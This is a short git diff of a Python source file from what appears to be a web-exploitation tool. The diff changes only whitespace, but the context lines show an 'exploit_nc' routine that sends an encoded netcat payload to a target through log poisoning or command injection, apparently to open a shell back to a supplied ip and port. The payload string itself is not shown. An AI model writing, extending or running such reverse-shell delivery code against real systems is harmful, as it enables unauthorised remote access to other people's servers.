@@ -7,7 +7,7 @@ from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 
 def exploit_nc(exploit, method, ip, port):
-    
+
     url = exploit['GETVAL']
     post = exploit["POSTVAL"]
 
@@ -47,7 +47,7 @@ def exploit_nc(exploit, method, ip, port):
     if(method == "TRUNC"):
         exploit_log_poison(ip, port, url, encode(ncPayload), "", ncTest, "/nc", exploit['POSTVAL'])
         return True
-   
+
     if(method == "CMD"):
         if(args.mode == "post"): 
             res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(ncTest)), config.proxies, "", "")
